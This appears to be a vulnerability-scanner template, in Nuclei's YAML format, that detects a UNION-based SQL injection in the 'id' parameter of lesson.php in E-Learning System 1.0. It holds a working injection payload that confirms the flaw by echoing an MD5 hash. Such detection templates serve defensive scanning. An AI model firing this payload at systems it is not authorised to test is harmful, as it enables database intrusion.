id: elearning-system-sqli

info:
  name: E-Learning System 1.0 - 'id' SQL Injection
  author: xuxeong
  severity: critical
  description: |
    The E-Learning System version 1.0 suffers from an authenticated/unauthenticated SQL Injection vulnerability via the 'id' parameter in lesson.php. 
    An attacker can exploit this to extract sensitive database information using UNION-based techniques.
  reference:
    - https://www.exploit-db.com/exploits/49434
  metadata:
    verified: true
  tags: sqli,elearning,webapp

http:
  - method: GET
    path:
      - "{{BaseURL}}/lesson.php?id=-1%20UNION%20SELECT%201,2,md5(123),4,5"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b70"
        part: body

      - type: status
        status:
          - 200